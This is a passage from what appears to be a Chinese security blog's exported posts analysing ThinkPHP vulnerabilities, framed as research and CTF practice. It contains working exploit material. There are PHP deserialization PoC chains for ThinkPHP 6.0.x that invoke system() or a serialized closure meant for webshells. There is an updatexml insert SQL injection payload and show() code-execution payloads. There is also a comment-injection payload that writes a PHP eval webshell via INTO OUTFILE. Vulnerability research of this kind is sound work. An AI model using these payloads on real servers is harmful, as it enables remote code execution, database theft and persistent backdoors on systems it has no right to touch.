class=\"variable\">$lazySave</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$suffix</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$a</span> = <span class=\"string\">&#x27;&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;exists = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;force = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;lazySave = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;withEvent = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;suffix = <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode(serialize(<span class=\"keyword\">new</span> Pivot(<span class=\"keyword\">new</span> Pivot())));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"v6-0-0-v6-0-12\"><a href=\"#v6-0-0-v6-0-12\" class=\"headerlink\" title=\"v6.0.0-v6.0.12\"></a>v6.0.0-v6.0.12</h1><p>不过在利用点上面的if语句里有 <code>getJsonValue</code> 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/c73bfe21dc8b4204aa15124720ef5c63.png\"></p>\n<p>跟进，利用没有限制</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/2db60aa8b776458f92f7a60c3e911db4.png\"></p>\n<p>还是可以利用</p>\n<p>不过在进入<code>getJsonValue</code>之前的那个if 得通过修改<code>$this-&gt;json</code>来进入if</p>\n<p>还有让<code>$this-&gt;jsonAssoc = true</code> 而且必须是<code>数组套数组</code>的形式</p>\n<p>poc: 测试6.0.9也可执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>\\<span class=\"title\">concern</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">trait</span> Attribute&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$data</span>=[<span class=\"string\">&#x27;jiang&#x27;</span>=&gt;[<span class=\"string\">&#x27;jiang&#x27;</span>=&gt;<span class=\"string\">&#x27;calc&#x27;</span>]];</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$withAttr</span>=[<span class=\"string\">&#x27;jiang&#x27;</span>=&gt;[<span class=\"string\">&#x27;jiang&#x27;</span>=&gt;<span class=\"string\">&#x27;system&#x27;</span>]];</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$json</span>=[<span class=\"string\">&quot;jiang&quot;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$jsonAssoc</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">trait</span> ModelEvent&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$withEvent</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">model</span>\\<span class=\"title\">concern</span>\\<span class=\"title\">Attribute</span>;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">model</span>\\<span class=\"title\">concern</span>\\<span class=\"title\">ModelEvent</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$exists</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$force</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$lazySave</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$suffix</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$a</span> = <span class=\"string\">&#x27;&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;exists = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;force = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;lazySave = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;withEvent = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;suffix = <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode(serialize(<span class=\"keyword\">new</span> Pivot(<span class=\"keyword\">new</span> Pivot())));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"SerializableClosure-v6-0-3\"><a href=\"#SerializableClosure-v6-0-3\" class=\"headerlink\" title=\"SerializableClosure(v6.0.3)\"></a>SerializableClosure(v6.0.3)</h1><p>还有另外一种 利用 <code>SerializableClosure</code> 来构造payload</p>\n<p>还有一种方法就是用 ThinkPHP 自带的 SerializableClosure 来调用，我们来看一下这个方法。<br>主要是上面 <code>getValue()</code> 方法里的漏洞点，也就是构造pop链的最后的地方：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$closure</span> = <span class=\"keyword\">$this</span>-&gt;withAttr[<span class=\"variable\">$fieldName</span>];</span><br><span class=\"line\"><span class=\"variable\">$value</span> = <span class=\"variable\">$closure</span>(<span class=\"variable\">$value</span>, <span class=\"keyword\">$this</span>-&gt;data);</span><br></pre></td></tr></table></figure>\n\n<p>我们通过一步步控制 <code>$closure</code> 和 <code>$this-&gt;data</code> 最后构造并执行了动态函数。但是由于参数的限制，通过第一种方法我们无法执行 phpinfo() 这样的函数，所以我们尝试另一种方法，也就是利用 SerializableClosure。</p>\n<p><code>\\Opis\\Closure</code> 可用于<code>序列化匿名函数</code>，使得匿名函数同样可以进行序列化操作。这意味着我们可以<code>序列化一个匿名函数</code>，然后交由上述的 <code>$closure($value, $this-&gt;data)</code> 调用执行，即：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$func</span> = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;phpinfo();&#125;;</span><br><span class=\"line\"><span class=\"variable\">$closure</span> = <span class=\"keyword\">new</span> \\Opis\\<span class=\"built_in\">Closure</span>\\SerializableClosure(<span class=\"variable\">$func</span>);</span><br><span class=\"line\"><span class=\"variable\">$closure</span>(<span class=\"variable\">$value</span>, <span class=\"keyword\">$this</span>-&gt;data);  <span class=\"comment\">// 这里的参数可以不用管</span></span><br></pre></td></tr></table></figure>\n\n<p>以上述代码为例，将调用phpinfo()函数。同样也可以通过将 <code>phpinfo();</code> 改为别的来写webshell。</p>\n<p>修改上面的 <code>v6.0.3</code> 的POC即可：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>\\<span class=\"title\">concern</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">trait</span> Attribute&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$data</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$withAttr</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">trait</span> ModelEvent&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$withEvent</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Model</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">model</span>\\<span class=\"title\">concern</span>\\<span class=\"title\">Attribute</span>;</span><br><span class=\"line\">    <span class=\"keyword\">use</span> <span class=\"title\">model</span>\\<span class=\"title\">concern</span>\\<span class=\"title\">ModelEvent</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$exists</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$force</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$lazySave</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$suffix</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$a</span> = <span class=\"string\">&#x27;&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;   </span><br><span class=\"line\">    <span class=\"variable\">$func</span> = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;phpinfo();&#125;;  <span class=\"comment\">//可写马，测试用的phpinfo;</span></span><br><span class=\"line\">    <span class=\"variable\">$b</span>=\\Opis\\<span class=\"built_in\">Closure</span>\\serialize(<span class=\"variable\">$func</span>);</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;exists = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;force = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;lazySave = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;withEvent = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;suffix = <span class=\"variable\">$a</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;data=[<span class=\"string\">&#x27;jiang&#x27;</span>=&gt;<span class=\"string\">&#x27;&#x27;</span>];</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"variable\">$c</span>=unserialize(<span class=\"variable\">$b</span>); </span><br><span class=\"line\">    <span class=\"keyword\">$this</span>-&gt;withAttr=[<span class=\"string\">&#x27;jiang&#x27;</span>=&gt;<span class=\"variable\">$c</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">think</span>\\<span class=\"title\">model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">think</span>\\<span class=\"title\">Model</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Pivot</span> <span class=\"keyword\">extends</span> <span class=\"title\">Model</span></span>&#123;&#125;</span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">&#x27;closure/autoload.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> urlencode(serialize(<span class=\"keyword\">new</span> Pivot(<span class=\"keyword\">new</span> Pivot())));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>本地构造 poc 需要下载文件 <a href=\"https://github.com/opis/closure\">https://github.com/opis/closure</a></p>\n<p>将 poc.php 与文件夹放到同一目录下</p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHP 5.0.15 Insert注入 分析","url":"/2023/12/25/ThinkPHP%205.0.15%20insert%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>在 <code>parseData()</code> 这个方法中出现对<code>dec</code>、<code>inc</code> 两种情况的考虑不周从而拼接导致的SQL注入（Insert方法注入）<br>漏洞利用版本： <strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15 、 5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong></p>\n<p>我这垃圾文笔！这个师傅写的不错</p>\n<p><a href=\"https://blog.csdn.net/weixin_45669205/article/details/116401771\">ThinkPHP5.0.15代码审计【SQL注入】</a></p>\n<h1 id=\"复现\"><a href=\"#复现\" class=\"headerlink\" title=\"复现\"></a>复现</h1><p>写入控制器</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/1faf0b53b60546dfb66a31ab6b72da80.png\"></p>\n<a id=\"more\"></a>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/5ef4889543a54cbb8645f7b03adacbd0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16\"></p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?a[0]&#x3D;dec&amp;a[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;a[2]&#x3D;1</span><br><span class=\"line\">?a[0]&#x3D;inc&amp;a[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;a[2]&#x3D;1</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p>a这个参数要接收数组形式！所以我们写成了<code>get(&#39;a/a&#39;)</code>，注意后面的 <code>/a</code> 就是要求 <code>传入数组形式</code>。数组形式是后面利用的<code>前提</code>。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/4d77770ed75a44e6a08453cc9936d061.png\"></p>\n<p>跟进insert函数 第一个参数要求数组形式</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/a1ea3e2511ba4a93a80263019bb3ce13.png\"></p>\n<p>跟进 <code>parseExpress()</code> 函数发现 就是获取一下数据库中的表等其他操作</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/3f9e654e2a004311bb63d09bd452f5c8.png\"></p>\n<p>然后 <code>$data=array_merge($options[&#39;data&#39;], $data);</code> 将我们传入的数组与 <code>$options中的data(空数组)</code> 进行合并，放入到$data</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e9699224f1964f5cb61b127ca889bd7c.png\"></p>\n<p>接下来生成sql语句 : <code>$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);</code></p>\n<p>跟进 <code>insert()</code> 函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">abstract class Builder</span><br><span class=\"line\">thinkphp&#x2F;library&#x2F;think&#x2F;db&#x2F;Builder.php</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/9eaff951b6ef4ddf8557160934034d27.png\"></p>\n<p>跟进 <code>parseData()</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f73327dbdb574fd9afc986cd4f394516.png\"></p>\n<p>getFieldsBind()就是获取一下字段名然后返回parseData()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f649f13596344e2b9be68b6445b0cba3.png\"></p>\n<p>问题出现在这里</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/50c016a8171d4b0582f02fa77e6dad45.png\"></p>\n<p>因为$val是个数组所以进入这一分支</p>\n<p>不管是<code>dec</code>还是<code>inc</code> 都将 <code>$val[1]拼接成语句然后存到$result[$item]</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/189ca8c7163249499ee92a91fd2abdee.png\"></p>\n<p>将$result返回到insert()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b5370814af5849b391c574aec21773c9.png\"></p>\n<p>将<code>键等于 $fields</code> 将<code>值等于 $values</code></p>\n<p>接着进行替换</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/469c1f9068fb40f59c3424d5a48f2bd0.png\"></p>\n<p>返回</p>\n<p> <code>$sql=INSERT INTO </code>users<code> (</code>username<code>) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)-1)</code></p>\n<p>执行sql语句</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/a7f97ffb85fb4725807287e63528b1b0.png\"></p>\n<h1 id=\"流程图\"><a href=\"#流程图\" class=\"headerlink\" title=\"流程图\"></a>流程图</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/88d1072530664f77bacf762692be5ece.png\"></p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHP show方法参数可控 命令执行","url":"/2023/12/25/ThinkPHP%20show%E6%96%B9%E6%B3%95%E5%8F%82%E6%95%B0%E5%8F%AF%E6%8E%A7%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","content":"<h1 id=\"漏洞详情\"><a href=\"#漏洞详情\" class=\"headerlink\" title=\"漏洞详情\"></a>漏洞详情</h1><p>show方法参数可控导致rce</p>\n<a id=\"more\"></a>\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><p>控制器写入demo</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">namespace Home\\Controller;</span><br><span class=\"line\">use Think\\Controller;</span><br><span class=\"line\">class IndexController extends Controller &#123;</span><br><span class=\"line\">    public function index($n)&#123;</span><br><span class=\"line\">        $this-&gt;show($n);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当<code>模板引擎(TMPL_ENGINE_TYPE)</code>不同时存在两种情况 1.php 2. Think</p>\n<p>一、php</p>\n<p>传入 利用方式：eval执行代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">url&#x2F;?n&#x3D;&lt;?php system(&#39;whoami&#39;);?&gt; </span><br></pre></td></tr></table></figure>\n\n<p>二、Think<br>传入 利用方式：后续生成缓存文件利用include执行代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?n&#x3D;&lt;?php system(&#39;whoami&#39;);?&gt; 或 &#x2F;?n&#x3D;&lt;php&gt;phpinfo();&lt;&#x2F;php&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/651c62ce7b2d4353aceb21f07991b6ca.png\"></p>\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><h2 id=\"当模板为php\"><a href=\"#当模板为php\" class=\"headerlink\" title=\"当模板为php\"></a>当模板为php</h2><p>进入<code>display</code>方法 $countent为命令代码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e472dc841b7f4c318590d408fdefd656.png\"></p>\n<p>进入fetch方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e3997a21fd844fcab227c738213fce42.png\"></p>\n<p>在fetch方法中if判断 因为此时的模板为php 所以执行下面的eval代码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/9173ad573843441ea77bb7ae60194364.png\"></p>\n<h2 id=\"当模板为Think\"><a href=\"#当模板为Think\" class=\"headerlink\" title=\"当模板为Think\"></a>当模板为Think</h2><p>依旧进入<code>fetch方法</code><br>将变量合并到数组$params然后进入<code>listen方法</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/908d27d896684cb59b05ea7c21963b98.png\"></p>\n<p>listen方法中获取了<code>$name</code> <code>$tag</code> 将我们的<code>$params</code>传入exec方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/8e226649c4d14d5eaf6b940cc29cfb40.png\"></p>\n<p>此时$tag被设置为run 最终进入<code>ParseTemplateBehavior</code>类中的run方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/8ac472623a684a07877d1f617ba0d373.png\"></p>\n<p>Run方法中，先检查缓存是否有效，因为第一次传入，所以进入else分支</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/7c7d6dcfb2424d73928ba689af64f033.png\"></p>\n<p>跟进<code>Template类中的fetch方法</code>，调用 <code>loadTemplate</code>方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/a9c02355cec447c49dd2b5d8b8b62251.png\"></p>\n<p>loadTemplate中经过compiler后生成缓存代码，调用put方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/add57546dfe245baa63c7f36387e253b.png\"></p>\n<p>调用File类中的put方法，写入代码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/4f8c12df43794b1db8d500ca45634b9b.png\"></p>\n<p>一直返回到Template类中的fetch方法去调用load</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Storage::load($templateCacheFile,$this-&gt;tVar,null,&#39;tpl&#39;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/9bddb640f6ce43df93f0fdfeeaab7263.png\"></p>\n<p>include 缓存文件 执行代码，当执行相同的代码时，由于相同内容的md5相同，所以缓存文件存在，所以在进入run方法中，直接调用load</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/363f6521e4114ed2892fd4d8d566900d.png\"></p>\n<p>也就是说当初次调用命令时，生成缓存文件并进行文件包含，当再次调用时，直接包含文件</p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHP v3.2 comment 注释注入写shell","url":"/2023/12/25/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/","content":"<h1 id=\"漏洞详情\"><a href=\"#漏洞详情\" class=\"headerlink\" title=\"漏洞详情\"></a>漏洞详情</h1><p>comment函数是用来进行查询注释功能，当执行sql语句时，搭配comment可能存在利用注释进行 <code>写shell</code>或者 <code>时间盲注</code></p>\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><p>控制器写入demo</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$user &#x3D; M(&#39;Users&#39;)-&gt;comment($id)-&gt;find(intval($id));</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1*&#x2F; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;3.php&quot; LINES STARTING BY &#39;&lt;?php eval($_POST[0]);?&gt;&#39;&#x2F;*</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/80b3ae7446c643fca59b073466c53b0c.png\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><p>首先看一下函数调用栈</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e1ebf8f94d424ab4b41cd7d01202e7db.png\"></p>\n<p>开始跟进调试</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/695622b2fbba4508b5cbfe6ec1121686.png\"></p>\n<p>跟进comment函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/fbb9cf64899b44f093df8805aa1ca851.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16\"></p>\n<p>给<code>$options加上comment</code>就是我们传入的东西</p>\n<p>中间过程同thinkphp 3.2.3find 注入过程分析相同，往下走到这里select方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/6a900e3398c04e7dacd5f8eaea1e0167.png\"></p>\n<p>跟进，对$options中的model和bind进行操作，不影响</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b4f0a52457494c11893be3596cd578ae.png\"></p>\n<p>跟进<code>buildSelectSql()</code>开始构建sql语句</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20dea038e2c34d8c90e32226f697cf74.png\"></p>\n<p>跟进 <code>parseSql()</code>，分析 $options中的comment</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/abbfc9af56d84d579187cc7c6447bdd4.png\"></p>\n<p>跟进</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f7b9b139ca03456aad4dc572f3573578.png\"></p>\n<p>我们传入的comment被加入到注释中，可以通过闭合前后注释进行注入</p>\n<p>先尝试一下</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/5054a83556bc4570b3ce6aa714c236f7.png\"></p>\n<p>构造的sql语句注入点在LIMIT 1 后面的地方，也就是说</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT [注入点]</span><br></pre></td></tr></table></figure>\n<p>那么怎么利用这一点？</p>\n<h2 id=\"堆叠时间盲注\"><a href=\"#堆叠时间盲注\" class=\"headerlink\" title=\"堆叠时间盲注\"></a>堆叠时间盲注</h2><p>本地测试可以尝试<code>堆叠注入方式来进行时间盲注</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1*&#x2F;;select if(substr(database(),1,1)&#x3D;&#39;s&#39;,sleep(3),0)&#x2F;*</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/161b37ef94ea418b8605aff85fd0a56d.png\"></p>\n<p>ctfshow 题目环境下</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/1201c45b1bf8428c817939d04430dc03.png\"></p>\n<h2 id=\"LIMIT后-注入方法\"><a href=\"#LIMIT后-注入方法\" class=\"headerlink\" title=\"LIMIT后 注入方法\"></a>LIMIT后 注入方法</h2><p><a href=\"https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html\">Mysql下Limit注入方法 | 离别歌 (leavesongs.com)</a></p>\n<p><a href=\"https://www.cnblogs.com/natian-ws/p/7203277.html\">Mysql注入点在limit关键字后面的利用方法 - 那天ws </a></p>\n<p>此方法适用于<code>MySQL 5.x中</code>，在 <code>limit语句后面的注入</code></p>\n<p>首先查看 <code>select</code> 用法</p>\n<figure class=\"highlight plain\"><table><tr><td 